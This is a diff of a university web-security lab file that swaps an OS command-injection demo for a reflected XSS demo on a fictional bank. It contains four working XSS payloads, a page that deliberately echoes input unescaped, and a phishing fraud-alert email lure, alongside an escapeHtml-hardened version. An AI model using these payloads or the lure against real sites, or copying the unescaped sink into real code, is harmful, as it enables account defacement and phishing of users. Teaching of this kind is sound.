@@ -1,413 +1,599 @@
-/**
- * ============================================================================
- *  WEB SECURITY ASSIGNMENT
- *  Category : OS Command Injection
- *  Variant  : In-band (output returned)
- *  Instructor: Dr. Soumyadev Maity
- * ============================================================================
- *
- *  This single file boots THREE independent Express servers:
- *
- *    PORT 4000  -> Attacker Command Center (recon + exploit delivery console)
- *    PORT 3001  -> "NetDiag Pro" VULNERABLE instance   (unsafe exec())
- *    PORT 3002  -> "NetDiag Pro" HARDENED instance      (safe execFile() + allow-list)
- *
- *  App concept: NetDiag Pro is an internal network-ops dashboard. A logged-in
- *  "netadmin" user can ping internal hosts from the browser. The `host`
- *  parameter is the injection point.
- *
- *  Run:  npm install && npm run dev
- *  Then open:
- *    http://localhost:4000   (Attacker Command Center)
- *    http://localhost:3001   (Vulnerable NetDiag Pro)
- *    http://localhost:3002   (Hardened NetDiag Pro)
- * ============================================================================
- */
+// =============================================================================
+//  CYBERSECURITY LAB: REFLECTED CROSS-SITE SCRIPTING (XSS) DEMONSTRATION
+//  FULL TWO-SIDED ARCHITECTURE WITH LIVE ATTACKER CONSOLE & CAMPAIGN TELEMETRY
+// =============================================================================
+//
+//  Course           : Web Server Vulnerabilities & Defense
+//  Category         : Cross-Site Scripting (XSS)
+//  Variant          : Reflected XSS
+//  Target System    : Apex Trust Online Banking
+//  Instructor       : Dr. Soumyadev Maity
+//  Submission Due   : 03 November 2026, 23:59
+//
+//  Port Architecture:
+//    • Port 4000 → ATTACKER SIDE: Phishing Portal, Live Telemetry & Vector Matrix
+//    • Port 3001 → USER SIDE: Apex Trust Online Banking (Vulnerable Instance)
+//    • Port 3002 → USER SIDE: Apex Trust Online Banking (Secured / Hardened Instance)
+//
+// =============================================================================
 
-const express = require('express');
-const { exec, execFile } = require('child_process');
-const os = require('os');
+const express = require("express");
 
-// ping's "count" flag differs by OS: Windows uses -n, Linux/macOS use -c.
-// We also add a short timeout flag (-w 300 on Windows / -W 1 on Unix) so that
-// pings to unreachable IPs (e.g. 10.0.0.1) respond in milliseconds instead of hanging for 4+ seconds.
-// Force '-n' if running on Windows or WSL targeting Windows binaries:
-const IS_WIN = os.platform() === 'win32' || process.platform === 'win32' || true; // Set to true if on Windows
-const PING_COUNT_FLAG = IS_WIN ? '-n' : '-c';
-const PING_TIMEOUT_FLAG = IS_WIN ? '-w' : '-W';
-const PING_TIMEOUT_VAL = IS_WIN ? '300' : '1';
+// -----------------------------------------------------------------------------
+// HTML ENTITY ENCODER (USED BY SECURE INSTANCE AND PREVIEWS)
+// -----------------------------------------------------------------------------
+function escapeHtml(str) {
+  if (typeof str !== "string") return "";
+  return str
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
 
-// ---------------------------------------------------------------------------
-// Shared mock data — gives the target portal a realistic corporate feel
-// ---------------------------------------------------------------------------
-const MOCK_SESSION = { user: 'netadmin', role: 'Network Operations', lastLogin: '2026-11-03 08:14 IST' };
-const MOCK_HOSTS = [
-  { name: 'core-router-01', ip: '10.0.0.1', status: 'UP' },
-  { name: 'app-server-02', ip: '10.0.0.14', status: 'UP' },
-  { name: 'db-primary', ip: '10.0.0.22', status: 'DEGRADED' },
-  { name: 'edge-cache-07', ip: '10.0.0.41', status: 'UP' },
+// -----------------------------------------------------------------------------
+// SHARED MOCK DATA: SIMULATED BANKING LEDGER
+// -----------------------------------------------------------------------------
+const MOCK_ACCOUNT = {
+  holder: "Alex Mercer",
+  accountNumber: "ACT-8492-9102",
+  accountType: "Premier Checking",
+  balance: "$14,820.50",
+  routingNumber: "021000089",
+};
+
+const MOCK_TRANSACTIONS = [
+  { id: "TX-1001", date: "2026-11-01", description: "Direct Deposit - Global Tech Payroll", category: "Income", amount: "+$4,500.00" },
+  { id: "TX-1002", date: "2026-10-30", description: "Metropolitan Utility Service - Electricity", category: "Utilities", amount: "-$145.20" },
+  { id: "TX-1003", date: "2026-10-28", description: "Whole Foods Market - Groceries", category: "Food & Dining", amount: "-$86.40" },
+  { id: "TX-1004", date: "2026-10-25", description: "Apex Mortgage Transfer", category: "Housing", amount: "-$1,850.00" },
+  { id: "TX-1005", date: "2026-10-22", description: "Cloudflare Subscription", category: "Services", amount: "-$20.00" },
 ];
 
-// In-memory telemetry log shared by the vulnerable/hardened instances so the
-// attacker console can show a step-by-step trace of what happened server-side.
-const telemetry = [];
-function logEvent(instance, msg) {
-  const entry = { ts: new Date().toISOString(), instance, msg };
-  telemetry.push(entry);
-  if (telemetry.length > 200) telemetry.shift();
-  console.log(`[${entry.ts}] [${instance}] ${msg}`);
+// -----------------------------------------------------------------------------
+// FOUR DISTINCT REFLECTED XSS USE CASES & VECTORS
+// -----------------------------------------------------------------------------
+const USE_CASES = [
+  {
+    id: "usecase-1",
+    name: "Use Case 1: Standard Script Tag Execution",
+    subtitle: "Classic Script Tag Injection in Element Body",
+    description: "The payload injects a standard <script> tag into the HTML element body (<div>${query}</div>). Demonstrates that the browser executes arbitrary JavaScript in the application's origin context.",
+    payload: "<script>alert('🚨 Use Case 1 Executed!\\n\\nOrigin: ' + document.domain + '\\nStandard script tag parsed in HTML body.')</script>",
+  },
+  {
+    id: "usecase-2",
+    name: "Use Case 2: DOM Defacement & Visual Tampering",
+    subtitle: "Altering What the User Sees in the UI (No Alert Dialog)",
+    description: "Instead of a pop-up dialog, the injected script dynamically modifies the bank's DOM elements: it changes the user's balance to $0.00 and alters the account status banner to a fake 'ACCOUNT FROZEN' emergency notice.",
+    payload: "<script>document.getElementById('display-balance').innerText='$0.00'; document.getElementById('account-status').innerHTML='<span style=\"color:#ef4444; font-weight:800; background:#fee2e2; padding:2px 8px; border-radius:4px;\">⚠️ FROZEN (UNDER INVESTIGATION)</span>'; document.getElementById('security-banner').innerHTML='<div style=\"background:#dc2626; color:white; padding:12px; border-radius:6px; font-weight:700;\">🚨 NOTICE: Unrecognized activity detected. Account assets restricted!</div>';</script>",
+  },
+  {
+    id: "usecase-3",
+    name: "Use Case 3: Filter Evasion via Event Handlers",
+    subtitle: "Bypassing Naive <script> Tag Blocklists",
+    description: "When naive developers attempt to filter or blacklist the word '<script>', attackers bypass it using HTML5 inline event handlers (such as <img onerror=...> or <svg onload=...>) that execute without any <script> tag.",
+    payload: "<img src='invalid-image' onerror=\"alert('⚠️ Use Case 3 Executed!\\n\\nExecuted via <img> onerror event handler!\\nBypasses filters that only block <script> tags.')\">",
+  },
+  {
+    id: "usecase-4",
+    name: "Use Case 4: Attribute Breakout Injection",
+    subtitle: "Breaking Out of Quoted HTML Tag Attributes",
+    description: "User input is often reflected inside input tags: <input value=\"${query}\">. An attacker uses a double quote (\") to close the value attribute early and inject an event handler (autofocus onfocus=...).",
+    payload: '" autofocus onfocus="alert(\'⚡ Use Case 4 Executed!\\n\\nAttribute Breakout: Closed the value attribute using double quotes to inject the onfocus event!\')',
+  }
+];
+
+
+// =============================================================================
+// =============================================================================
+// WEBSITE 1: THE ATTACKER SIDE (PORT 4000)
+// =============================================================================
+// =============================================================================
+
+const attackerApp = express();
+const ATTACKER_PORT = 4000;
+
+// Mobile-friendly script viewer route
+attackerApp.get("/script", (_req, res) => {
+  res.sendFile(__dirname + "/video_script.html");
+});
+
+attackerApp.get("/", (_req, res) => {
+  const primaryExploit = USE_CASES[0].payload;
+  const vulnLink = `http://localhost:3001/transactions?q=${encodeURIComponent(primaryExploit)}`;
+  const safeLink = `http://localhost:3002/transactions?q=${encodeURIComponent(primaryExploit)}`;
+
+  const vectorCards = USE_CASES.map((uc, index) => {
+    const vLink = `http://localhost:3001/transactions?q=${encodeURIComponent(uc.payload)}`;
+    const sLink = `http://localhost:3002/transactions?q=${encodeURIComponent(uc.payload)}`;
+
+    return `
+      <div style="background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 1.25rem; margin-bottom: 1.25rem;">
+        <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 0.5rem;">
+          <div>
+            <h3 style="color: #38bdf8; font-size: 1.05rem; font-weight: 700;">${escapeHtml(uc.name)}</h3>
+            <div style="font-size: 0.8rem; color: #94a3b8; font-style: italic;">${escapeHtml(uc.subtitle)}</div>
+          </div>
+          <span style="background: #020617; color: #cbd5e1; font-size: 0.75rem; padding: 0.2rem 0.5rem; border-radius: 4px; font-family: monospace;">Vector #${index + 1}</span>
+        </div>
+        
+        <p style="font-size: 0.85rem; color: #cbd5e1; line-height: 1.5; margin: 0.5rem 0;">${escapeHtml(uc.description)}</p>
+        
+        <div style="background: #020617; color: #e2e8f0; font-family: monospace; font-size: 0.75rem; padding: 0.6rem; border-radius: 4px; overflow-x: auto; margin: 0.5rem 0; border: 1px solid #334155;">
+          ${escapeHtml(uc.payload)}
+        </div>
+
+        <div style="display: flex; gap: 0.75rem; margin-top: 0.75rem; flex-wrap: wrap;">
+          <a href="${vLink}" target="_blank" onclick="recordClick('Vector #${index + 1} (${uc.name.split(':')[0]})', 'Vulnerable Server (3001)')" style="background: #dc2626; color: white; text-decoration: none; padding: 0.45rem 0.9rem; border-radius: 5px; font-size: 0.8rem; font-weight: 700;">
+            ⚡ Trigger on Vulnerable Bank (Port 3001) &rarr;
+          </a>
+          <a href="${sLink}" target="_blank" onclick="recordClick('Vector #${index + 1} (${uc.name.split(':')[0]})', 'Hardened Server (3002)')" style="background: #16a34a; color: white; text-decoration: none; padding: 0.45rem 0.9rem; border-radius: 5px; font-size: 0.8rem; font-weight: 700;">
+            🛡️ Verify Blocked on Hardened Bank (Port 3002) &rarr;
+          </a>
+        </div>
+      </div>
+    `;
+  }).join("");
+
+  res.send(`
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <title>Attacker Command Center & Campaign Telemetry</title>
+      <style>
+        :root {
+          --dark-bg: #0b0f19;
+          --dark-surface: #151d30;
+          --dark-border: #243049;
+          --accent-red: #ef4444;
+          --accent-green: #22c55e;
+          --accent-cyan: #38bdf8;
+          --text: #f8fafc;
+          --text-muted: #94a3b8;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background: var(--dark-bg); color: var(--text); padding-bottom: 60px; line-height: 1.5; }
+        header { background: #020617; border-bottom: 1px solid var(--dark-border); padding: 1.25rem 2rem; display: flex; justify-content: space-between; align-items: center; }
+        .badge { background: var(--accent-red); color: white; padding: 0.25rem 0.75rem; border-radius: 9999px; font-size: 0.75rem; font-weight: 700; letter-spacing: 0.05em; }
+        .container { max-width: 1100px; margin: 2rem auto; padding: 0 1rem; }
+        
+        .grid-dashboard { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 1rem; margin-bottom: 1.5rem; }
+        .stat-card { background: var(--dark-surface); border: 1px solid var(--dark-border); border-radius: 8px; padding: 1.2rem; }
+        .stat-label { font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; font-weight: 700; letter-spacing: 0.05em; }
+        .stat-value { font-size: 1.25rem; font-weight: 700; color: #f1f5f9; margin-top: 0.35rem; }
+
+        .card { background: var(--dark-surface); border: 1px solid var(--dark-border); border-radius: 10px; padding: 1.5rem; margin-bottom: 1.5rem; }
+        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; padding-bottom: 0.75rem; border-bottom: 1px solid var(--dark-border); }
+        .card-title { font-size: 1.15rem; font-weight: 700; color: #f1f5f9; display: flex; align-items: center; gap: 0.5rem; }
+
+        /* Terminal Feed */
+        .terminal { background: #020617; border: 1px solid #1e293b; border-radius: 8px; padding: 1rem; font-family: "Courier New", Courier, monospace; font-size: 0.8rem; color: #a7f3d0; max-height: 220px; overflow-y: auto; }
+        .log-entry { margin-bottom: 0.4rem; display: flex; gap: 0.75rem; }
+        .log-time { color: var(--text-muted); }
+        .log-tag-info { color: var(--accent-cyan); font-weight: 700; }
+        .log-tag-click { color: #facc15; font-weight: 700; }
+        .log-tag-vuln { color: var(--accent-red); font-weight: 700; }
+        .log-tag-safe { color: var(--accent-green); font-weight: 700; }
+
+        /* Phishing Email Preview */
+        .email-container { background: #ffffff; color: #0f172a; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.4); }
+        .email-header { background: #f8fafc; padding: 1rem 1.5rem; border-bottom: 1px solid #e2e8f0; }
+        .email-field { font-size: 0.85rem; margin-bottom: 0.25rem; color: #334155; }
+        .email-field strong { color: #64748b; display: inline-block; width: 70px; }
+        .email-subject { font-size: 1.1rem; font-weight: 800; color: #0f172a; margin-top: 0.5rem; }
+        .email-body { padding: 1.5rem; font-size: 0.95rem; line-height: 1.6; }
+        .cta-btn { display: inline-block; background: #dc2626; color: white !important; font-weight: 700; text-decoration: none; padding: 0.85rem 1.75rem; border-radius: 6px; margin: 1.25rem 0; box-shadow: 0 4px 6px -1px rgba(220, 38, 38, 0.4); }
+        .cta-btn:hover { background: #b91c1c; }
+        .cta-btn-safe { display: inline-block; background: #16a34a; color: white !important; font-weight: 700; text-decoration: none; padding: 0.85rem 1.75rem; border-radius: 6px; margin: 1.25rem 0; }
+        .cta-btn-safe:hover { background: #15803d; }
+      </style>
+
+      <script>
+        function recordClick(vectorName, destination) {
+          const feed = document.getElementById("terminal-feed");
+          const now = new Date();
+          const timeStr = now.toTimeString().split(' ')[0] + '.' + String(now.getMilliseconds()).padStart(3, '0');
+          
+          const isSafe = destination.includes("3002");
+          const tagClass = isSafe ? "log-tag-safe" : "log-tag-vuln";
+          const tagText = isSafe ? "[DEFENSE-BLOCKED]" : "[VICTIM-CLICKED]";
+          
+          const entry = document.createElement("div");
+          entry.className = "log-entry";
+          entry.innerHTML = 
+            '<span class="log-time">' + timeStr + '</span> ' +
+            '<span class="' + tagClass + '">' + tagText + '</span> ' +
+            '<span>Victim triggered <strong>' + vectorName + '</strong> &rarr; Target: ' + destination + '</span>';
+          
+          feed.appendChild(entry);
+          feed.scrollTop = feed.scrollHeight;
+
+          const counter = document.getElementById("click-counter");
+          if (counter) {
+            counter.innerText = parseInt(counter.innerText || "0") + 1;
+          }
+        }
+      </script>
+    </head>
+    <body>
+      <header>
+        <div style="display: flex; align-items: center; gap: 0.75rem;">
+          <span style="font-size: 1.6rem;">🕵️</span>
+          <div>
+            <div style="font-size: 1.15rem; font-weight: 700;">Attacker Command Center & Phishing Simulation</div>
+            <div style="font-size: 0.75rem; color: var(--text-muted);">External Adversary Infrastructure (Port 4000)</div>
+          </div>
+        </div>
+        <span class="badge">SIDE 1: ATTACKER CONSOLE</span>
+      </header>
+
+      <div class="container">
+        
+        <!-- Live Campaign Metrics -->
+        <div class="grid-dashboard">
+          <div class="stat-card">
+            <div class="stat-label">Target Organization</div>
+            <div class="stat-value" style="color: var(--accent-cyan);">Apex Trust Bank</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-label">Exploited Endpoint</div>
+            <div class="stat-value" style="font-family: monospace; font-size: 1rem;">GET /transactions?q=</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-label">Target Account</div>
+            <div class="stat-value">Alex Mercer</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-label">Live Clicks Tracked</div>
+            <div id="click-counter" class="stat-value" style="color: #facc15;">0</div>
+          </div>
+        </div>
+
+        <!-- Live Campaign Telemetry Terminal -->
+        <div class="card">
+          <div class="card-header">
+            <h2 class="card-title"><span>📡</span> Live Campaign Activity & Telemetry Feed</h2>
+            <span style="font-size: 0.8rem; color: var(--accent-green); font-weight: 600;">● Listener Active</span>
+          </div>
+          <p style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 0.75rem;">
+            Watch the console below in real time as the victim interacts with phishing lures or test links:
+          </p>
+          <div id="terminal-feed" class="terminal">
+            <div class="log-entry">
+              <span class="log-time">[SYSTEM-INIT]</span>
+              <span class="log-tag-info">[CAMPAIGN-READY]</span>
+              <span>Reconnaissance complete. Reflection sink confirmed on http://localhost:3001/transactions.</span>
+            </div>
+            <div class="log-entry">
+              <span class="log-time">[SYSTEM-INIT]</span>
+              <span class="log-tag-info">[EMAIL-DISPATCH]</span>
+              <span>High-urgency fraud alert lure drafted and queued for delivery to alex.mercer@company.com.</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Simulated Phishing Mailbox -->
+        <div class="card">
+          <div class="card-header">
+            <h2 class="card-title"><span>📧</span> Social Engineering Lure: Victim's Mailbox Preview</h2>
+            <span style="font-size: 0.8rem; color: var(--text-muted);">Simulated Webmail Client</span>
+          </div>
+          <p style="font-size: 0.9rem; color: #cbd5e1; margin-bottom: 1rem;">
+            This is what appears on the victim's screen. The email uses urgency (unauthorized withdrawal alert) to compel the user to click:
+          </p>
+
+          <div class="email-container">
+            <div class="email-header">
+              <div class="email-field"><strong>From:</strong> Apex Fraud Prevention &lt;alerts@apex-trust-security.fake&gt;</div>
+              <div class="email-field"><strong>To:</strong> Alex Mercer &lt;alex.mercer@company.com&gt;</div>
+              <div class="email-field"><strong>Date:</strong> 03 November 2026 21:30</div>
+              <div class="email-subject">⚠️ URGENT: Unrecognized Wire Withdrawal of $1,850.00</div>
+            </div>
+
+            <div class="email-body">
+              <div style="font-size: 1.1rem; font-weight: 800; color: #1e3a8a; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem;">
+                <span>🏛️</span> Apex Trust Online Banking — Security Operations
+              </div>
+              <p>Dear Customer Alex Mercer,</p>
+              <br>
+              <p>Our automated fraud monitoring algorithms detected an unauthorized wire withdrawal attempt of <strong>$1,850.00</strong> originating from an unrecognized IP address.</p>
+              <br>
+              <p>If you did not authorize this transaction, review your active transaction ledger immediately and file a dispute:</p>
+
+              <!-- Working Exploit Button -->
+              <div style="text-align: center; margin: 1.5rem 0;">
+                <a href="${vulnLink}" target="_blank" onclick="recordClick('Primary Lure (Script Alert)', 'Vulnerable Server (3001)')" class="cta-btn">
+                  🔍 Click Here to Review Disputed Transaction (Vulnerable Server) &rarr;
+                </a>
+                <div style="font-size: 0.8rem; color: #64748b; margin-top: 0.5rem;">
+                  Directs victim to: <code>http://localhost:3001/transactions?q=&lt;script&gt;...</code>
+                </div>
+              </div>
+
+              <hr style="border: none; border-top: 1px solid #e2e8f0; margin: 1.5rem 0;">
+
+              <!-- Hardened Server Test Button -->
+              <p style="font-size: 0.9rem; color: #475569;">
+                <strong>Test Implemented Defense:</strong> Send the exact same payload to the <strong>Hardened / Secure</strong> instance (Port 3002):
+              </p>
+              <div style="text-align: center; margin-top: 0.75rem;">
+                <a href="${safeLink}" target="_blank" onclick="recordClick('Primary Lure (Hardened Test)', 'Hardened Server (3002)')" class="cta-btn-safe">
+                  🛡️ Click Here to Send Same Payload to Hardened Server (Port 3002) &rarr;
+                </a>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- 4 Use Cases Showcase Matrix -->
+        <div class="card">
+          <div class="card-header">
+            <h2 class="card-title"><span>⚡</span> Exploit Vector Showcase (4 Distinct Use Cases)</h2>
+            <span style="font-size: 0.8rem; color: var(--text-muted);">Multiple Reflection Sinks & Manifestations</span>
+          </div>
+          <p style="font-size: 0.9rem; color: #cbd5e1; margin-bottom: 1.25rem;">
+            Test each distinct Reflected XSS attack vector below. Notice how clicking any button instantly updates the telemetry feed above:
+          </p>
+          ${vectorCards}
+        </div>
+
+        <!-- Architecture Breakdown -->
+        <div class="card" style="border-left: 4px solid var(--accent-cyan);">
+          <h3 style="color: var(--accent-cyan); margin-bottom: 0.5rem;">🎓 Key Viva Takeaway: The Client-Side Execution Boundary</h3>
+          <p style="font-size: 0.9rem; color: #cbd5e1; line-height: 1.6;">
+            Notice what happens when the victim clicks the link: The browser opens a direct TCP connection with <strong>Port 3001 (The Bank)</strong>.
+            The payload bounces off the bank's server and executes inside the victim's local browser process.
+            The attacker's server (Port 4000) does <strong>not</strong> automatically receive the user's password or screen—this is why Reflected XSS is classified as a <em>client-side reflection vulnerability</em>.
+            Defense-in-depth controls like <strong>Content Security Policy (connect-src 'self')</strong> exist specifically to ensure that the injected script can never establish an unauthorized outbound network connection.
+          </p>
+        </div>
+
+      </div>
+    </body>
+    </html>
+  `);
+});
+
+
+// =============================================================================
+// =============================================================================
+// WEBSITE 2: THE USER SIDE — APEX TRUST ONLINE BANKING (PORTS 3001 & 3002)
+// =============================================================================
+// =============================================================================
+
+function renderBankPage({ isSecure, query, filteredTransactions }) {
+  const port = isSecure ? 3002 : 3001;
+  const instanceBadge = isSecure ? "SECURE INSTANCE (PORT 3002)" : "VULNERABLE INSTANCE (PORT 3001)";
+  const badgeColor = isSecure ? "#16a34a" : "#dc2626";
+
+  const rows = filteredTransactions.map(t => `
+    <tr>
+      <td style="padding: 0.75rem 1rem; border-bottom: 1px solid #e2e8f0; font-size: 0.9rem;">${t.date}</td>
+      <td style="padding: 0.75rem 1rem; border-bottom: 1px solid #e2e8f0; font-size: 0.9rem;"><strong>${isSecure ? escapeHtml(t.description) : t.description}</strong></td>
+      <td style="padding: 0.75rem 1rem; border-bottom: 1px solid #e2e8f0; font-size: 0.9rem;"><span style="background: #f1f5f9; padding: 0.2rem 0.5rem; border-radius: 4px; font-family: monospace;">${isSecure ? escapeHtml(t.category) : t.category}</span></td>
+      <td style="padding: 0.75rem 1rem; border-bottom: 1px solid #e2e8f0; font-size: 0.9rem; font-weight: 600; color: ${t.amount.startsWith('+') ? '#16a34a' : '#0f172a'};">${t.amount}</td>
+    </tr>
+  `).join("");
+
+  let searchBanner = "";
+  if (query) {
+    if (isSecure) {
+      const safeQuery = escapeHtml(query);
+      searchBanner = `
+        <div style="background: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 6px; padding: 1rem; margin-bottom: 1.5rem; color: #166534;">
+          <strong>🔍 Showing transaction results for:</strong> <code>${safeQuery}</code>
+          <div style="font-size: 0.8rem; margin-top: 0.25rem; color: #15803d;">
+            ✅ MITIGATION ACTIVE: Input passed through escapeHtml(). Tags and quotes converted to entities.
+          </div>
+        </div>
+      `;
+    } else {
+      searchBanner = `
+        <div id="security-banner" style="background: #fef2f2; border: 1px solid #fecaca; border-radius: 6px; padding: 1rem; margin-bottom: 1.5rem; color: #991b1b;">
+          <strong>🔍 Showing transaction results for:</strong> <strong>${query}</strong>
+          <div style="font-size: 0.8rem; margin-top: 0.25rem; color: #b91c1c;">
+            ⚠️ VULNERABLE REFLECTION SINK: The server echoed the query string into the HTML response without encoding.
+          </div>
+        </div>
+      `;
+    }
+  }
+
+  const vectorButtons = USE_CASES.map(uc => {
+    const link = `http://localhost:${port}/transactions?q=${encodeURIComponent(uc.payload)}`;
+    return `
+      <a href="${link}" style="background: ${isSecure ? '#16a34a' : '#dc2626'}; color: white; text-decoration: none; padding: 0.35rem 0.65rem; border-radius: 4px; font-size: 0.75rem; font-weight: 600; display: inline-block;">
+        ${uc.name.split(':')[0]}
+      </a>
+    `;
+  }).join(" ");
+
+  return `
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <title>Apex Trust Online Banking | ${isSecure ? 'Secure' : 'Vulnerable'}</title>
+      <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background: #f8fafc; color: #0f172a; line-height: 1.5; padding-bottom: 50px; }
+        header { background: #172554; color: white; padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; }
+        .badge { background: ${badgeColor}; color: white; padding: 0.3rem 0.75rem; border-radius: 9999px; font-size: 0.75rem; font-weight: 700; }
+        .nav { background: white; border-bottom: 1px solid #e2e8f0; padding: 0 2rem; display: flex; gap: 1.5rem; align-items: center; }
+        .nav a { padding: 0.85rem 0; text-decoration: none; color: #64748b; font-size: 0.9rem; font-weight: 600; border-bottom: 2px solid transparent; }
+        .nav a.active { color: #1e3a8a; border-bottom-color: #1e3a8a; }
+        .container { max-width: 1000px; margin: 2rem auto; padding: 0 1rem; }
+        .card { background: white; border-radius: 8px; border: 1px solid #e2e8f0; padding: 1.5rem; margin-bottom: 1.5rem; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
+        .stat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 1rem; }
+        .stat-box { background: #f8fafc; padding: 1rem; border-radius: 6px; border: 1px solid #e2e8f0; }
+        .stat-label { font-size: 0.75rem; color: #64748b; text-transform: uppercase; font-weight: 700; }
+        .stat-val { font-size: 1.35rem; font-weight: 700; color: #0f172a; margin-top: 0.25rem; }
+        table { width: 100%; border-collapse: collapse; }
+        th { background: #f8fafc; padding: 0.75rem 1rem; font-size: 0.8rem; font-weight: 700; color: #64748b; text-transform: uppercase; border-bottom: 1px solid #e2e8f0; text-align: left; }
+      </style>
+    </head>
+    <body>
+      <header>
+        <div style="display: flex; align-items: center; gap: 0.75rem;">
+          <span style="font-size: 1.5rem;">🏛️</span>
+          <div>
+            <div style="font-size: 1.15rem; font-weight: 700;">Apex Trust Online Banking</div>
+            <div style="font-size: 0.75rem; color: #cbd5e1;">Logged in user: Alex Mercer (Premier Checking)</div>
+          </div>
+        </div>
+        <div>
+          <span class="badge">${instanceBadge}</span>
+        </div>
+      </header>
+
+      <nav class="nav">
+        <a href="/" class="active">Account Overview</a>
+        <a href="/transactions">Transaction History</a>
+        <a href="http://localhost:4000" target="_blank" style="color: #dc2626; margin-left: auto; font-size: 0.85rem;">
+          🕵️ Open Attacker Showcase Portal (Port 4000) &rarr;
+        </a>
+      </nav>
+
+      <div class="container">
+        <div class="card">
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
+            <h2>Account Overview</h2>
+            <span id="account-status" style="font-size: 0.85rem; color: #16a34a; font-weight: 600;">● Active Session</span>
+          </div>
+          <div class="stat-grid">
+            <div class="stat-box">
+              <div class="stat-label">Available Balance</div>
+              <div id="display-balance" class="stat-val" style="color: #16a34a;">${MOCK_ACCOUNT.balance}</div>
+            </div>
+            <div class="stat-box">
+              <div class="stat-label">Account Number</div>
+              <div class="stat-val">${MOCK_ACCOUNT.accountNumber}</div>
+            </div>
+            <div class="stat-box">
+              <div class="stat-label">Routing Number</div>
+              <div class="stat-val">${MOCK_ACCOUNT.routingNumber}</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
+            <h3>Transaction Activity</h3>
+            <span style="font-size: 0.85rem; color: #64748b;">${filteredTransactions.length} records</span>
+          </div>
+
+          <form action="/transactions" method="GET" style="display: flex; gap: 0.5rem; margin-bottom: 1.25rem;">
+            <input type="text" name="q" value="${isSecure ? escapeHtml(query) : query}" placeholder="Search merchant or description..." style="flex: 1; padding: 0.65rem 1rem; border: 1px solid #cbd5e1; border-radius: 6px;">
+            <button type="submit" style="background: #1e3a8a; color: white; border: none; padding: 0.65rem 1.25rem; border-radius: 6px; font-weight: 600; cursor: pointer;">Search</button>
+          </form>
+
+          ${searchBanner}
+
+          <table>
+            <thead>
+              <tr>
+                <th>Date</th>
+                <th>Description / Payee</th>
+                <th>Category</th>
+                <th>Amount</th>
+              </tr>
+            </thead>
+            <tbody>
+              ${rows || '<tr><td colspan="4" style="text-align:center; padding: 1.5rem; color: #64748b;">No matching transactions.</td></tr>'}
+            </tbody>
+          </table>
+        </div>
+
+        <div class="card" style="background: #f8fafc;">
+          <h4 style="font-size: 0.9rem; color: #475569; margin-bottom: 0.5rem;">Test Exploit Vectors Directly on This Instance:</h4>
+          <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
+            ${vectorButtons}
+          </div>
+        </div>
+
+      </div>
+    </body>
+    </html>
+  `;
 }
 
-// ---------------------------------------------------------------------------
-// Shared page chrome (corporate styling) — used by both 3001 and 3002
-// ---------------------------------------------------------------------------
-function pageShell({ title, badge, badgeColor, body }) {
-  return `<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8">
-<title>${title} — NetDiag Pro</title>
-<style>
-  :root{--bg:#0f1420;--panel:#171d2b;--border:#2a3246;--text:#e7ebf3;--muted:#8b93a7;--accent:#3b82f6;}
-  *{box-sizing:border-box;}
-  body{margin:0;font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);}
-  header{display:flex;align-items:center;justify-content:space-between;padding:16px 28px;background:var(--panel);border-bottom:1px solid var(--border);}
-  .brand{font-weight:700;font-size:1.2rem;letter-spacing:.3px;}
-  .brand span{color:var(--accent);}
-  .badge{padding:4px 12px;border-radius:20px;font-size:.75rem;font-weight:600;background:${badgeColor};color:#fff;}
-  .session{font-size:.8rem;color:var(--muted);text-align:right;}
-  main{max-width:960px;margin:32px auto;padding:0 20px;}
-  .card{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:22px 26px;margin-bottom:22px;}
-  .card h2{margin-top:0;font-size:1.05rem;color:var(--text);}
-  table{width:100%;border-collapse:collapse;font-size:.88rem;}
-  th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--border);}
-  .status-UP{color:#22c55e;font-weight:600;}
-  .status-DEGRADED{color:#f59e0b;font-weight:600;}
-  input[type=text]{width:100%;padding:10px 12px;border-radius:6px;border:1px solid var(--border);background:#0c111b;color:var(--text);font-family:monospace;font-size:.9rem;}
-  button{background:var(--accent);color:#fff;border:none;padding:10px 18px;border-radius:6px;font-weight:600;cursor:pointer;margin-top:10px;}
-  button:hover{opacity:.9;}
-  pre{background:#0c111b;border:1px solid var(--border);border-radius:6px;padding:14px;white-space:pre-wrap;word-break:break-word;font-size:.82rem;max-height:320px;overflow:auto;}
